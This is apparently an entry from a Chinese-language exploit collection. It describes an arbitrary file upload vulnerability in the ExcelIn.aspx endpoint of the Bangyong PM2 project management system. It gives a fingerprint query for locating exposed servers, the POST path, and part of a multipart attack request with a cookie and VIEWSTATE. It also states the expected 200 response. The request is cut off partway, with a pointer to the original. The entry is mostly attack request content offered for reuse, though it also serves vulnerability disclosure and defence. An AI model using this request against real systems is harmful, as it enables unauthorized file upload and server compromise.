# 邦永PM2项目管理系统ExcelIn.aspx存在任意文件上传

- **系统**：邦永PM2项目管理系统　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`body="PM2项目管理系统BS版增强工具.zip"`
- **请求**：`POST /FlowChartDefine/ExcelIn.aspx HTTP/1.1`

**请求体 / payload**
```
[http://ip/FlowChartDefine/ExcelIn.aspx](http://ip/FlowChartDefine/ExcelIn.aspx)
上传压缩包
Host:
Content-Type: multipart/form-data; boundary=---------------------------335518608136410266804188096265
Accept-Ldwk: bG91ZG9uZ3dlbmt1
Priority: u=0, i
Cookie: ASP.NET_SessionId=hovcho2iwrxygzgkt0l2oomc
-----------------------------335518608136410266804188096265
Content-Disposition: form-data; name="__VIEWSTATE"
CX8CDdAjNN9+19sa3xOCEybpUx0hn5DnMqGQQzm1JI+njfE/pGi9oDDI5PRCH8wVs/UCahOCnHho2chhS8X5jCYrh1hzlOaS5VIl/VYxh3LhmXkQwsOYhNFmg9+ZmmilXRKT5WAN6WceP6U9c1Kqtw==
-----------------------------33551860813641…（脚本共 2046 字，完整版见原文）
```
- **预期**：200　|　—